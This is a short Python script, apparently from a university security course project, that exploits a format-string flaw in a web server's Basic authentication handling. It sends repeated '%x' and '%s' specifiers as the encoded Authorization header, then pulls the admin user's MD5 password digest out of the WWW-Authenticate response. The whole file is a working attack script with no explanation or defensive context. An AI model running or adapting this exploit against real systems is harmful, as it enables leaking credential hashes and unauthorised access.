import requests
import base64
import time


p = "%x"
s = "%s"

username = "admin"

for i in range(1, 20):
    payl = i*p + s
    headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
   
    try:
        response = requests.get("http://project-2.csec.chatzi.org:8000", headers=headers, timeout=2)
        password_index = response.headers['WWW-Authenticate'].find(username)
        if password_index != -1:
            password_index+=len(username+":")
            print("MD5 Digest: " + response.headers['WWW-Authenticate'][password_index:password_index + 32])
            exit()
    except requests.Timeout:
        continue
    except requests.RequestException as e:
        continue

    time.sleep(1)